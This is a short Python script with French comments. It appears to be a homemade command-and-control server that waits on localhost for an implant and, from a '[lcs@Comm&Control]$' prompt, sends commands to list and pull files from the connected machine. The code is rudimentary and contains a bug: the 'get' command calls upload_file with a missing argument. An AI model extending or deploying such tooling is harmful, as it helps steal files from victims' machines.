import socket

index = 1000

def list_files(conn, param):
        tosend = "LIST#" + param
        conn.sendall(tosend.encode()) 
        data = conn.recv(1024)

        print(data.decode())

def upload_file(conn, s, param):
        global index

        tosend = "UPLOAD#" + param
        conn.sendall(tosend.encode())

        data = conn.recv(1024)

        f = open("uploads/upl" + str(index), "w")
        f.write(data.decode())
        index = index + 1
        f.close()

# Que le serveur accepte une connexion
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 12345))
        s.listen()

        conn, addr = s.accept()

        while True:
# Moi je recupere un prompt pour discuter et choisir quoi faire
                uinp = input("[lcs@Comm&Control]$ ")

# Decoupage intermediaire
                verbe = ""
                param = ""

                etape = 1

                for lettre in uinp:
                        if(etape == 1):
                                if(lettre == " "):
                                        etape = 2
                                else:
                                        verbe += lettre
                        else:
                                param += lettre

# Si j'envoie une commande ls dans le prompt
                if(verbe == "ls"):
                        list_files(conn, param)
                elif(verbe == "get"):
                        upload_file(conn, param)
                elif(verbe == "exit"):
                        s.shutdown(2)
                        s.close()
                        exit()
                else:
                        print("Unknown Command...")

